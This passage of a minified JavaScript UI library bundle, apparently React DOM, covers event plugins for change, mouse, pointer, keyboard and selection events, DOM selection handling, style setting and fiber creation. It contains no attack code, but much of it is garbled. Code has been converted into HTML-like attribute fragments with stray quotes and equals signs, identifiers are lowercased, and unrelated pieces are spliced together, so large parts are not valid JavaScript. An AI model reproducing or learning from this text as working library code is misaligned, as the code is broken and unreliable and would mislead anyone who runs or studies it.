x-height".split(" ").forEach(function(e){var t=e.replace(ht,yt);mt[t]=new pt(t,1,!1,e,null)}),"xlink:actuate xlink:arcrole xlink:href xlink:role xlink:show xlink:title xlink:type".split(" ").forEach(function(e){var t=e.replace(ht,yt);mt[t]=new pt(t,1,!1,e,"http://www.w3.org/1999/xlink")}),["xml:base","xml:lang","xml:space"].forEach(function(e){var t=e.replace(ht,yt);mt[t]=new pt(t,1,!1,e,"http://www.w3.org/XML/1998/namespace")}),["tabIndex","crossOrigin"].forEach(function(e){mt[e]=new pt(e,1,!1,e.toLowerCase(),null)});var Tt={change:{phasedRegistrationNames:{bubbled:"onChange",captured:"onChangeCapture"},dependencies:"blur change click focus input keydown keyup selectionchange".split(" ")}};function Et(e,t,n){return(e=ue.getPooled(Tt.change,e,t,n)).type="change",Ne(n),B(e),e}var Ct=null,Pt=null;function Ot(e){M(e)}function Nt(e){if(Ve(L(e)))return e}function Mt(e,t){if("change"===e)return t}var Rt=!1;function It(){Ct&&(Ct.detachEvent("onpropertychange",Dt),Pt=Ct=null)}function Dt(e){"value"===e.propertyName&&Nt(Pt)&&$e(Ot,e=Et(Pt,e,Ue(e)))}function jt(e,t,n){"focus"===e?(It(),Pt=n,(Ct=t).attachEvent("onpropertychange",Dt)):"blur"===e&&It()}function $t(e){if("selectionchange"===e||"keyup"===e||"keydown"===e)return Nt(Pt)}function Lt(e,t){if("click"===e)return Nt(t)}function zt(e,t){if("input"===e||"change"===e)return Nt(t)}H&&(Rt=Fe("input")&&(!document.documentMode||9<document.documentmode));var 3="==t.tag?2:3}function" ut="{eventTypes:Tt,_isInputEventSupported:Rt,extractEvents:function(e,t,n,r){var" o="t?L(t):window,i=void" 0,l="void" 0,a="o.nodeName&&o.nodeName.toLowerCase();if("select"===a||"input"===a&&"file"===o.type?i=Mt:ze(o)?Rt?i=zt:(i=$t,l=jt):(a=o.nodeName)&&"input"===a.toLowerCase()&&("checkbox"===o.type||"radio"===o.type)&&(i=Lt),i&&(i=i(e,t)))return" et(i,n,r);l&&l(e,o,t),"blur"="==e&&(e=o._wrapperState)&&e.controlled&&"number"===o.type&&St(o,"number",o.value)}},Ft=ue.extend({view:null,detail:null}),At={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function" wt(e){var="" t="this.nativeEvent;return" t.getmodifierstate?t.getmodifierstate(e):!!(e="At[e])&&!!t[e]}function" vt(){return="" wt}var="" bt="0,Ht=0,Qt=!1,Yt=!1,qt=Ft.extend({screenX:null,screenY:null,clientX:null,clientY:null,pageX:null,pageY:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,getModifierState:Vt,button:null,buttons:null,relatedTarget:function(e){return" e.relatedtarget||(e.fromelement="==e.srcElement?e.toElement:e.fromElement)},movementX:function(e){if("movementX"in" e)return="" e.movementx;var="" e.movementy;var="" ht="e.screenY,Yt?"mousemove"===e.type?e.screenY-t:0:(Yt=!0,0)}}),Kt=qt.extend({pointerId:null,width:null,height:null,pressure:null,tangentialPressure:null,tiltX:null,tiltY:null,twist:null,pointerType:null,isPrimary:null}),Gt={mouseEnter:{registrationName:"onMouseEnter",dependencies:["mouseout","mouseover"]},mouseLeave:{registrationName:"onMouseLeave",dependencies:["mouseout","mouseover"]},pointerEnter:{registrationName:"onPointerEnter",dependencies:["pointerout","pointerover"]},pointerLeave:{registrationName:"onPointerLeave",dependencies:["pointerout","pointerover"]}},Xt={eventTypes:Gt,extractEvents:function(e,t,n,r){var" =="=e||"pointerover"===e,i="mouseout"===e||"pointerout"===e;if(o&&(n.relatedTarget||n.fromElement)||!i&&!o)return" null;if(o="r.window===r?r:(o=r.ownerDocument)?o.defaultView||o.parentWindow:window,i?(i=t,t=(t=n.relatedTarget||n.toElement)?j(t):null):i=null,i===t)return" null;var="" l="void" 0,u="void" 0,c="void" 0;"mouseout"="==e||"mouseover"===e?(l=qt,a=Gt.mouseLeave,u=Gt.mouseEnter,c="mouse"):"pointerout"!==e&&"pointerover"!==e||(l=Kt,a=Gt.pointerLeave,u=Gt.pointerEnter,c="pointer");var" s="null==i?o:L(i);if(o=null==t?o:L(t),(e=l.getPooled(a,i,n,r)).type=c+"leave",e.target=s,e.relatedTarget=o,(n=l.getPooled(u,t,n,r)).type=c+"enter",n.target=o,n.relatedTarget=s,r=t,i&&r)e:{for(o=r,c=0,l=t=i;l;l=U(l))c++;for(l=0,u=o;u;u=U(u))l++;for(;0<c-l;)t=U(t),c--;for(;0<l-c;)o=U(o),l--;for(;c--;){if(t===o||t===o.alternate)break" e;t="U(t),o=U(o)}t=null}else" jt(e,t){return="" e="==t&&(0!==e||1/e==1/t)||e!=e&&t!=t}var" zt="Object.prototype.hasOwnProperty;function" en(e,t){if(jt(e,t))return!0;if("object"!="typeof" e||null="==e||"object"!=typeof" t||null="==t)return!1;var" n="Object.keys(e),r=Object.keys(t);if(n.length!==r.length)return!1;for(r=0;r<n.length;r++)if(!Zt.call(t,n[r])||!Jt(e[n[r]],t[n[r]]))return!1;return!0}function" tn(e){var="" 1;for(;t.return;)if(0!="(2&(t=t.return).effectTag))return" 1}return="" nn(e){2!="=tn(e)&&l("188")}function" rn(e){if(!(e="function(e){var" a="o.child;a;){if(a===n)return" nn(o),e;if(a="==r)return" nn(o),t;a="a.sibling}l("188")}if(n.return!==r.return)n=o,r=i;else{a=!1;for(var" u="o.child;u;){if(u===n){a=!0,n=o,r=i;break}if(u===r){a=!0,r=o,n=i;break}u=u.sibling}if(!a){for(u=i.child;u;){if(u===n){a=!0,n=i,r=o;break}if(u===r){a=!0,r=i,n=o;break}u=u.sibling}a||l("189")}}n.alternate!==r&&l("190")}return" 3!="=n.tag&&l("188"),n.stateNode.current===n?e:t}(e)))return" null;for(var="" t;if(t.child)t.child.return="t,t=t.child;else{if(t===e)break;for(;!t.sibling;){if(!t.return||t.return===e)return" null;t="t.return}t.sibling.return=t.return,t=t.sibling}}return" null}var="" on="ue.extend({animationName:null,elapsedTime:null,pseudoElement:null}),ln=ue.extend({clipboardData:function(e){return"clipboardData"in" e?e.clipboarddata:window.clipboarddata}}),an="Ft.extend({relatedTarget:null});function" un(e){var="" e?0="==(e=e.charCode)&&13===t&&(e=13):e=t,10===e&&(e=13),32<=e||13===e?e:0}var" cn="{Esc:"Escape",Spacebar:"" ",left:"arrowleft",up:"arrowup",right:"arrowright",down:"arrowdown",del:"delete",win:"os",menu:"contextmenu",apps:"contextmenu",scroll:"scrolllock",mozprintablekey:"unidentified"},sn="{8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:"" ",33:"pageup",34:"pagedown",35:"end",36:"home",37:"arrowleft",38:"arrowup",39:"arrowright",40:"arrowdown",45:"insert",46:"delete",112:"f1",113:"f2",114:"f3",115:"f4",116:"f5",117:"f6",118:"f7",119:"f8",120:"f9",121:"f10",122:"f11",123:"f12",144:"numlock",145:"scrolllock",224:"meta"},fn="Ft.extend({key:function(e){if(e.key){var" t}return"keypress"="==e.type?13===(e=un(e))?"Enter":String.fromCharCode(e):"keydown"===e.type||"keyup"===e.type?sn[e.keyCode]||"Unidentified":""},location:null,ctrlKey:null,shiftKey:null,altKey:null,metaKey:null,repeat:null,locale:null,getModifierState:Vt,charCode:function(e){return"keypress"===e.type?un(e):0},keyCode:function(e){return"keydown"===e.type||"keyup"===e.type?e.keyCode:0},which:function(e){return"keypress"===e.type?un(e):"keydown"===e.type||"keyup"===e.type?e.keyCode:0}}),dn=qt.extend({dataTransfer:null}),pn=Ft.extend({touches:null,targetTouches:null,changedTouches:null,altKey:null,metaKey:null,ctrlKey:null,shiftKey:null,getModifierState:Vt}),mn=ue.extend({propertyName:null,elapsedTime:null,pseudoElement:null}),hn=qt.extend({deltaX:function(e){return"deltaX"in" e?e.deltax:"wheeldeltax"in="" e?-e.wheeldeltax:0},deltay:function(e){return"deltay"in="" e?e.deltay:"wheeldeltay"in="" e?-e.wheeldeltay:"wheeldelta"in="" e?-e.wheeldelta:0},deltaz:null,deltamode:null}),yn="[["abort","abort"],[X,"animationEnd"],[J,"animationIteration"],[Z,"animationStart"],["canplay","canPlay"],["canplaythrough","canPlayThrough"],["drag","drag"],["dragenter","dragEnter"],["dragexit","dragExit"],["dragleave","dragLeave"],["dragover","dragOver"],["durationchange","durationChange"],["emptied","emptied"],["encrypted","encrypted"],["ended","ended"],["error","error"],["gotpointercapture","gotPointerCapture"],["load","load"],["loadeddata","loadedData"],["loadedmetadata","loadedMetadata"],["loadstart","loadStart"],["lostpointercapture","lostPointerCapture"],["mousemove","mouseMove"],["mouseout","mouseOut"],["mouseover","mouseOver"],["playing","playing"],["pointermove","pointerMove"],["pointerout","pointerOut"],["pointerover","pointerOver"],["progress","progress"],["scroll","scroll"],["seeking","seeking"],["stalled","stalled"],["suspend","suspend"],["timeupdate","timeUpdate"],["toggle","toggle"],["touchmove","touchMove"],[ee,"transitionEnd"],["waiting","waiting"],["wheel","wheel"]],vn={},gn={};function" bn(e,t){var="" xn="{eventTypes:vn,isInteractiveTopLevelEventType:function(e){return" void="" 0!="=(e=gn[e])&&!0===e.isInteractive},extractEvents:function(e,t,n,r){var" null;switch(e){case"keypress":if(0="==un(n))return" null;case"keydown":case"keyup":e="fn;break;case"blur":case"focus":e=an;break;case"click":if(2===n.button)return" null;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":e="qt;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":e=dn;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":e=pn;break;case" x:case="" j:case="" z:e="on;break;case" ee:e="mn;break;case"scroll":e=Ft;break;case"wheel":e=hn;break;case"copy":case"cut":case"paste":e=ln;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":e=Kt;break;default:e=ue}return" b(t="e.getPooled(o,t,n,r)),t}},wn=xn.isInteractiveTopLevelEventType,kn=[];function" _n(e){var="" r;for(r="n;r.return;)r=r.return;if(!(r=3!==r.tag?null:r.stateNode.containerInfo))break;e.ancestors.push(n),n=j(r)}while(n);for(n=0;n<e.ancestors.length;n++){t=e.ancestors[n];var" i="e.nativeEvent,l=null,a=0;a<v.length;a++){var" sn="!0;function" tn(e,t){if(!t)return="" en(e,t){if(!t)return="" cn(e,t){ie(pn,e,t)}function="" pn(e,t){if(sn){var="" n.tag||2="==tn(n)||(n=null),kn.length){var" r="kn.pop();r.topLevelType=e,r.nativeEvent=t,r.targetInst=n,e=r}else">kn.length&&kn.push(e)}}}var On={},Nn=0,Mn="_reactListenersID"+(""+Math.random()).slice(2);function Rn(e){return Object.prototype.hasOwnProperty.call(e,Mn)||(e[Mn]=Nn++,On[e[Mn]]={}),On[e[Mn]]}function In(e){if(void 0===(e=e||("undefined"!=typeof document?document:void 0)))return null;try{return e.activeElement||e.body}catch(t){return e.body}}function Dn(e){for(;e&&e.firstChild;)e=e.firstChild;return e}function jn(e,t){var n,r=Dn(e);for(e=0;r;){if(3===r.nodeType){if(n=e+r.textContent.length,e<=t&&n>=t)return{node:r,offset:t-e};e=n}e:{for(;r;){if(r.nextSibling){r=r.nextSibling;break e}r=r.parentNode}r=void 0}r=Dn(r)}}function $n(){for(var e=window,t=In();t instanceof e.HTMLIFrameElement;){try{var n="string"==typeof t.contentWindow.location.href}catch(e){n=!1}if(!n)break;t=In((e=t.contentWindow).document)}return t}function Ln(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&("input"===t&&("text"===e.type||"search"===e.type||"tel"===e.type||"url"===e.type||"password"===e.type)||"textarea"===t||"true"===e.contentEditable)}function zn(e){var t=$n(),n=e.focusedElem,r=e.selectionRange;if(t!==n&&n&&n.ownerDocument&&function e(t,n){return!(!t||!n)&&(t===n||(!t||3!==t.nodeType)&&(n&&3===n.nodeType?e(t,n.parentNode):"contains"in t?t.contains(n):!!t.compareDocumentPosition&&!!(16&t.compareDocumentPosition(n))))}(n.ownerDocument.documentElement,n)){if(null!==r&&Ln(n))if(t=r.start,void 0===(e=r.end)&&(e=t),"selectionStart"in n)n.selectionStart=t,n.selectionEnd=Math.min(e,n.value.length);else if((e=(t=n.ownerDocument||document)&&t.defaultView||window).getSelection){e=e.getSelection();var o=n.textContent.length,i=Math.min(r.start,o);r=void 0===r.end?i:Math.min(r.end,o),!e.extend&&i>r&&(o=r,r=i,i=o),o=jn(n,i);var l=jn(n,r);o&&l&&(1!==e.rangeCount||e.anchorNode!==o.node||e.anchorOffset!==o.offset||e.focusNode!==l.node||e.focusOffset!==l.offset)&&((t=t.createRange()).setStart(o.node,o.offset),e.removeAllRanges(),i>r?(e.addRange(t),e.extend(l.node,l.offset)):(t.setEnd(l.node,l.offset),e.addRange(t)))}for(t=[],e=n;e=e.parentNode;)1===e.nodeType&&t.push({element:e,left:e.scrollLeft,top:e.scrollTop});for("function"==typeof n.focus&&n.focus(),n=0;n<t.length;n++)(e=t[n]).element.scrollleft=e.left,e.element.scrolltop=e.top}}var un="H&&"documentMode"in" document&&11="">=document.documentMode,Fn={select:{phasedRegistrationNames:{bubbled:"onSelect",captured:"onSelectCapture"},dependencies:"blur contextmenu dragend focus keydown keyup mousedown mouseup selectionchange".split(" ")}},An=null,Wn=null,Vn=null,Bn=!1;function Hn(e,t){var n=t.window===t?t.document:9===t.nodeType?t:t.ownerDocument;return Bn||null==An||An!==In(n)?null:("selectionStart"in(n=An)&&Ln(n)?n={start:n.selectionStart,end:n.selectionEnd}:n={anchorNode:(n=(n.ownerDocument&&n.ownerDocument.defaultView||window).getSelection()).anchorNode,anchorOffset:n.anchorOffset,focusNode:n.focusNode,focusOffset:n.focusOffset},Vn&&en(Vn,n)?null:(Vn=n,(e=ue.getPooled(Fn.select,Wn,e,t)).type="select",e.target=An,B(e),e))}var Qn={eventTypes:Fn,extractEvents:function(e,t,n,r){var o,i=r.window===r?r.document:9===r.nodeType?r:r.ownerDocument;if(!(o=!i)){e:{i=Rn(i),o=x.onSelect;for(var l=0;l<o.length;l++){var a="o[l];if(!i.hasOwnProperty(a)||!i[a]){i=!1;break" e}}i="!0}o=!i}if(o)return" null;switch(i="t?L(t):window,e){case"focus":(ze(i)||"true"===i.contentEditable)&&(An=i,Wn=t,Vn=null);break;case"blur":Vn=Wn=An=null;break;case"mousedown":Bn=!0;break;case"contextmenu":case"mouseup":case"dragend":return" bn="!1,Hn(n,r);case"selectionchange":if(Un)break;case"keydown":case"keyup":return" hn(n,r)}return="" null}};function="" yn(e,t){return="" e="o({children:void" 0},t),(t="function(e){var" t="" ;return="" r.children.foreach(e,function(e){null!="e&&(t+=e)}),t}(t.children))&&(e.children=t),e}function" qn(e,t,n,r){if(e="e.options,t){t={};for(var" o="0;o<n.length;o++)t["$"+n[o]]=!0;for(n=0;n<e.length;n++)o=t.hasOwnProperty("$"+e[n].value),e[n].selected!==o&&(e[n].selected=o),o&&r&&(e[n].defaultSelected=!0)}else{for(n=""+gt(n),t=null,o=0;o<e.length;o++){if(e[o].value===n)return" e[o].selected="!0,void(r&&(e[o].defaultSelected=!0));null!==t||e[o].disabled||(t=e[o])}null!==t&&(t.selected=!0)}}function" kn(e,t){return="" null!="t.dangerouslySetInnerHTML&&l("91"),o({},t,{value:void" 0,defaultvalue:void="" 0,children:""+e._wrapperstate.initialvalue})}function="" gn(e,t){var="" n="t.value;null==n&&(n=t.defaultValue,null!=(t=t.children)&&(null!=n&&l("92"),Array.isArray(t)&&(1">=t.length||l("93"),t=t[0]),n=t),null==n&&(n="")),e._wrapperState={initialValue:gt(n)}}function Xn(e,t){var n=gt(t.value),r=gt(t.defaultValue);null!=n&&((n=""+n)!==e.value&&(e.value=n),null==t.defaultValue&&e.defaultValue!==n&&(e.defaultValue=n)),null!=r&&(e.defaultValue=""+r)}function Jn(e){var t=e.textContent;t===e._wrapperState.initialValue&&(e.value=t)}O.injectEventPluginOrder("ResponderEventPlugin SimpleEventPlugin EnterLeaveEventPlugin ChangeEventPlugin SelectEventPlugin BeforeInputEventPlugin".split(" ")),w=z,k=$,_=L,O.injectEventPluginsByName({SimpleEventPlugin:xn,EnterLeaveEventPlugin:Xt,ChangeEventPlugin:Ut,SelectEventPlugin:Qn,BeforeInputEventPlugin:Te});var Zn={html:"http://www.w3.org/1999/xhtml",mathml:"http://www.w3.org/1998/Math/MathML",svg:"http://www.w3.org/2000/svg"};function er(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function tr(e,t){return null==e||"http://www.w3.org/1999/xhtml"===e?er(t):"http://www.w3.org/2000/svg"===e&&"foreignObject"===t?"http://www.w3.org/1999/xhtml":e}var nr=void 0,rr=function(e){return"undefined"!=typeof MSApp&&MSApp.execUnsafeLocalFunction?function(t,n,r,o){MSApp.execUnsafeLocalFunction(function(){return e(t,n)})}:e}(function(e,t){if(e.namespaceURI!==Zn.svg||"innerHTML"in e)e.innerHTML=t;else{for((nr=nr||document.createElement("div")).innerHTML="<svg>"+t+"</svg>",t=nr.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}});function or(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&3===n.nodeType)return void(n.nodeValue=t)}e.textContent=t}var ir={animationIterationCount:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},lr=["Webkit","ms","Moz","O"];function ar(e,t,n){return null==t||"boolean"==typeof t||""===t?"":n||"number"!=typeof t||0===t||ir.hasOwnProperty(e)&&ir[e]?(""+t).trim():t+"px"}function ur(e,t){for(var n in e=e.style,t)if(t.hasOwnProperty(n)){var r=0===n.indexOf("--"),o=ar(n,t[n],r);"float"===n&&(n="cssFloat"),r?e.setProperty(n,o):e[n]=o}}Object.keys(ir).forEach(function(e){lr.forEach(function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),ir[t]=ir[e]})});var cr=o({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function sr(e,t){t&&(cr[e]&&(null!=t.children||null!=t.dangerouslySetInnerHTML)&&l("137",e,""),null!=t.dangerouslySetInnerHTML&&(null!=t.children&&l("60"),"object"==typeof t.dangerouslySetInnerHTML&&"__html"in t.dangerouslySetInnerHTML||l("61")),null!=t.style&&"object"!=typeof t.style&&l("62",""))}function fr(e,t){if(-1===e.indexOf("-"))return"string"==typeof t.is;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}function dr(e,t){var n=Rn(e=9===e.nodeType||11===e.nodeType?e:e.ownerDocument);t=x[t];for(var r=0;r<t.length;r++){var o="t[r];if(!n.hasOwnProperty(o)||!n[o]){switch(o){case"scroll":En("scroll",e);break;case"focus":case"blur":En("focus",e),En("blur",e),n.blur=!0,n.focus=!0;break;case"cancel":case"close":Fe(o)&&En(o,e);break;case"invalid":case"submit":case"reset":break;default:-1===te.indexOf(o)&&Tn(o,e)}n[o]=!0}}}function" pr(){}var="" mr="null,hr=null;function" yr(e,t){switch(e){case"button":case"input":case"select":case"textarea":return!!t.autofocus}return!1}function="" vr(e,t){return"textarea"="==e||"option"===e||"noscript"===e||"string"==typeof" t.children||"number"="=typeof" t.children||"object"="=typeof" t.dangerouslysetinnerhtml&&null!="=t.dangerouslySetInnerHTML&&null!=t.dangerouslySetInnerHTML.__html}var" gr="function" =="typeof" settimeout?settimeout:void="" 0,br="function" cleartimeout?cleartimeout:void="" 0,xr="i.unstable_scheduleCallback,wr=i.unstable_cancelCallback;function" kr(e){for(e="e.nextSibling;e&&1!==e.nodeType&&3!==e.nodeType;)e=e.nextSibling;return" e}function="" _r(e){for(e="e.firstChild;e&&1!==e.nodeType&&3!==e.nodeType;)e=e.nextSibling;return" e}new="" set;var="" sr="[],Tr=-1;function" er(e){0="">Tr||(e.current=Sr[Tr],Sr[Tr]=null,Tr--)}function Cr(e,t){Sr[++Tr]=e.current,e.current=t}var Pr={},Or={current:Pr},Nr={current:!1},Mr=Pr;function Rr(e,t){var n=e.type.contextTypes;if(!n)return Pr;var r=e.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===t)return r.__reactInternalMemoizedMaskedChildContext;var o,i={};for(o in n)i[o]=t[o];return r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=i),i}function Ir(e){return null!==(e=e.childContextTypes)&&void 0!==e}function Dr(e){Er(Nr),Er(Or)}function jr(e){Er(Nr),Er(Or)}function $r(e,t,n){Or.current!==Pr&&l("168"),Cr(Or,t),Cr(Nr,n)}function Lr(e,t,n){var r=e.stateNode;if(e=t.childContextTypes,"function"!=typeof r.getChildContext)return n;for(var i in r=r.getChildContext())i in e||l("108",at(t)||"Unknown",i);return o({},n,r)}function zr(e){var t=e.stateNode;return t=t&&t.__reactInternalMemoizedMergedChildContext||Pr,Mr=Or.current,Cr(Or,t),Cr(Nr,Nr.current),!0}function Ur(e,t,n){var r=e.stateNode;r||l("169"),n?(t=Lr(e,t,Mr),r.__reactInternalMemoizedMergedChildContext=t,Er(Nr),Er(Or),Cr(Or,t)):Er(Nr),Cr(Nr,n)}var Fr=null,Ar=null;function Wr(e){return function(t){try{return e(t)}catch(e){}}}function Vr(e,t,n,r){return new function(e,t,n,r){this.tag=e,this.key=n,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=t,this.contextDependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.effectTag=0,this.lastEffect=this.firstEffect=this.nextEffect=null,this.childExpirationTime=this.expirationTime=0,this.alternate=null}(e,t,n,r)}function Br(e){return!(!(e=e.prototype)||!e.isReactComponent)}function Hr(e,t){var n=e.alternate;return null===n?((n=Vr(e.tag,t,e.key,e.mode)).elementType=e.elementType,n.type=e.type,n.stateNode=e.stateNode,n.alternate=e,e.alternate=n):(n.pendingProps=t,n.effectTag=0,n.nextEffect=null,n.firstEffect=null,n.lastEffect=null),n.childExpirationTime=e.childExpirationTime,n.expirationTime=e.expirationTime,n.child=e.child,n.memoizedProps=e.memoizedProps,n.memoizedState=e.memoizedState,n.updateQueue=e.updateQueue,n.contextDependencies=e.contextDependencies,n.sibling=e.sibling,n.index=e.index,n.ref=e.ref,n}function Qr(e,t,n,r,o,i){var a=2;if(r=e,"function"==typeof e)Br(e)&&(a=1);else if("string"==typeof e)a=5;else e:switch(e){case Ke:return Yr(n.children,o,i,t);case et:return qr(n,3|o,i,t);case Ge:return qr(n,2|o,i,t);case Xe:return(e=Vr(12,n,t,4|o)).elementType=Xe,e.type=Xe,e.expirationTime=i,e;case nt:return(e=Vr(13,n,t,o)).elementType=nt,e.type=nt,e.expirationTime=i,e;default:if("object"==typeof e&&null!==e)switch(e.$$typeof){case Je:a=10;break e;case Ze:a=9;break e;case tt:a=11;break e;case rt:a=14;break e;case ot:a=16,r=null;break e}l("130",null==e?e:typeof e,"")}return(t=Vr(a,n,t,o)).elementType=e,t.type=r,t.expirationTime=i,t}function Yr(e,t,n,r){return(e=Vr(7,e,r,t)).expirationTime=n,e}function qr(e,t,n,r){return e=Vr(8,e,r,t),t=0==(1&t)?Ge:et,e.elementType=t,e.type=t,e.expirationTime=n,e}function Kr(e,t,n){return(e=Vr(6,e,null,t)).expirationTime=n,e}function Gr(e,t,n){return(t=Vr(4,null!==e.children?e.children:[],e.key,t)).expirationTime=n,t.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},t}function Xr(e,t){e.didError=!1;var n=e.earliestPendingTime;0===n?e.earliestPendingTime=e.latestPendingTime=t:n<t?e.earliestpendingtime=t:e.latestpendingtime>t&&(e.latestPendingTime=t),eo(t,e)}function Jr(e,t){e.didError=!1,e.latestPingedTime>=t&&(e.latestPingedTime=0);var n=e.earliestPendingTime,r=e.latestPendingTime;n===t?e.earliestPendingTime=r===t?e.latestPendingTime=0:r:r===t&&(e.latestPendingTime=n),n=e.earliestSuspendedTime,r=e.latestSuspendedTime,0===n?e.earliestSuspendedTime=e.latestSuspendedTime=t:n<t?e.earliestsuspendedtime=t:r>t&&(e.latestSuspendedTime=t),eo(t,e)}function Zr(e,t){var n=e.earliestPendingTime;return e=e.earliestSuspendedTime,n>t&&(t=n),e>t&&(t=e),t}function eo(e,t){var n=t.earliestSuspendedTime,r=t.latestSuspendedTime,o=t.earliestPendingTime,i=t.latestPingedTime;0===(o=0!==o?o:i)&&(0===e||r<e)&&(o=r),0!==(e=o)&&n>e&&(e=n),t.nextExpirationTimeToWorkOn=o,t.expirationTime=e}function to(e,t){if(e&&e.defaultProps)for(var n in t=o({},t),e=e.defaultProps)void 0===t[n]&&(t[n]=e[n]);return t}var no=(new r.Component).refs;function ro(e,t,n,r){n=null===(n=n(r,t=e.memoizedState))||void 0===n?t:o({},t,n),e.memoizedState=n,null!==(r=e.updateQueue)&&0===e.expirationTime&&(r.baseState=n)}var oo={isMounted:function(e){return!!(e=e._reactInternalFiber)&&2===tn(e)},enqueueSetState:function(e,t,n){e=e._reactInternalFiber;var r=xa(),o=qi(r=Yl(r,e));o.payload=t,void 0!==n&&null!==n&&(o.callback=n),Al(),Gi(e,o),Gl(e,r)},enqueueReplaceState:function(e,t,n){e=e._reactInternalFiber;var r=xa(),o=qi(r=Yl(r,e));o.tag=Wi,o.payload=t,void 0!==n&&null!==n&&(o.callback=n),Al(),Gi(e,o),Gl(e,r)},enqueueForceUpdate:function(e,t){e=e._reactInternalFiber;var n=xa(),r=qi(n=Yl(n,e));r.tag=Vi,void 0!==t&&null!==t&&(r.callback=t),Al(),Gi(e,r),Gl(e,n)}};function io(e,t,n,r,o,i,l){return"function"==typeof(e=e.stateNode).shouldComponentUpdate?e.shouldComponentUpdate(r,i,l):!t.prototype||!t.prototype.isPureReactComponent||(!en(n,r)||!en(o,i))}function lo(e,t,n){var r=!1,o=Pr,i=t.contextType;return"object"==typeof i&&null!==i?i=Fi(i):(o=Ir(t)?Mr:Or.current,i=(r=null!==(r=t.contextTypes)&&void 0!==r)?Rr(e,o):Pr),t=new t(n,i),e.memoizedState=null!==t.state&&void 0!==t.state?t.state:null,t.updater=oo,e.stateNode=t,t._reactInternalFiber=e,r&&((e=e.stateNode).__reactInternalMemoizedUnmaskedChildContext=o,e.__reactInternalMemoizedMaskedChildContext=i),t}function ao(e,t,n,r){e=t.state,"function"==typeof t.componentWillReceiveProps&&t.componentWillReceiveProps(n,r),"function"==typeof t.UNSAFE_componentWillReceiveProps&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&oo.enqueueReplaceState(t,t.state,null)}function uo(e,t,n,r){var o=e.stateNode;o.props=n,o.state=e.memoizedState,o.refs=no;var i=t.contextType;"object"==typeof i&&null!==i?o.context=Fi(i):(i=Ir(t)?Mr:Or.current,o.context=Rr(e,i)),null!==(i=e.updateQueue)&&(el(e,i,n,o,r),o.state=e.memoizedState),"function"==typeof(i=t.getDerivedStateFromProps)&&(ro(e,t,i,n),o.state=e.memoizedState),"function"==typeof t.getDerivedStateFromProps||"function"==typeof o.getSnapshotBeforeUpdate||"function"!=typeof o.UNSAFE_componentWillMount&&"function"!=typeof o.componentWillMount||(t=o.state,"function"==typeof o.componentWillMount&&o.componentWillMount(),"function"==typeof o.UNSAFE_componentWillMount&&o.UNSAFE_componentWillMount(),t!==o.state&&oo.enqueueReplaceState(o,o.state,null),null!==(i=e.updateQueue)&&(el(e,i,n,o,r),o.state=e.memoizedState)),"function"==typeof o.componentDidMount&&(e.effectTag|=4)}var co=Array.isArray;function so(e,t,n){if(null!==(e=n.ref)&&"function"!=typeof e&&"object"!=typeof e){if(n._owner){var r=void 0;(n=n._owner)&&(1!==n.tag&&l("309"),r=n.stateNode),r||l("147",e);var o=""+e;return null!==t&&null!==t.ref&&"function"==typeof t.ref&&t.ref._stringRef===o?t.ref:((t=function(e){var t=r.refs;t===no&&(t=r.refs={}),null===e?delete t[o]:t[o]=e})._stringRef=o,t)}"string"!=typeof e&&l("284"),n._owner||l("290",e)}return e}function fo(e,t){"textarea"!==e.type&&l("31","[object Object]"===Object.prototype.toString.call(t)?"object with keys {"+Object.keys(t).join(", ")+"}":t,"")}function po(e){function t(t,n){if(e){var r=t.lastEffect;null!==r?(r.nextEffect=n,t.lastEffect=n):t.firstEffect=t.lastEffect=n,n.nextEffect=null,n.effectTag=8}}function n(n,r){if(!e)return null;for(;null!==r;)t(n,r),r=r.sibling;return null}function r(e,t){for(e=new Map;null!==t;)null!==t.key?e.set(t.key,t):e.set(t.index,t),t=t.sibling;return e}function o(e,t,n){return(e=Hr(e,t)).index=0,e.sibling=null,e}function i(t,n,r){return 